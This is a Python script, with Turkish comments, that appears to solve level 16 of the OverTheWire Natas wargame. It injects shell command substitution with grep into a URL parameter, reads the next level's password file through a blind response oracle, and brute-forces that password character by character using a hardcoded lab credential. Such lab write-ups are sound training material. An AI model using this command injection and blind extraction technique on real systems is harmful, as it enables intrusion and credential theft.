import requests  
from requests.auth import HTTPBasicAuth  
  
auth=HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')  # giriş doğrulaması
  
filteredchars = ''  
passwd = ''  
allchars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'

for char in allchars:  # karakterleri sırayla dolaş.
    r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=doomed$(grep ' + char + ' /etc/natas_webpass/natas17)', auth=auth)  
   
    if 'doomed' not in r.text:  # bulunan karakteri ekle. yani şifrede olan karakteri.
        filteredchars = filteredchars + char  
        print(filteredchars)  
  
for i in range(32):   # şifre 32 karakter.
    for char in filteredchars:  # bulunan karakterler ile bruteforce saldırısı yap.
        r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=doomed$(grep ^' + passwd + char + ' /etc/natas_webpass/natas17)', auth=auth)  
    
        if 'doomed' not in r.text:  # eğer bir sonuç yoksa karakteri şifreye ekle sonra yeni karaktere geç.
            passwd = passwd + char  
            print(passwd)  
            break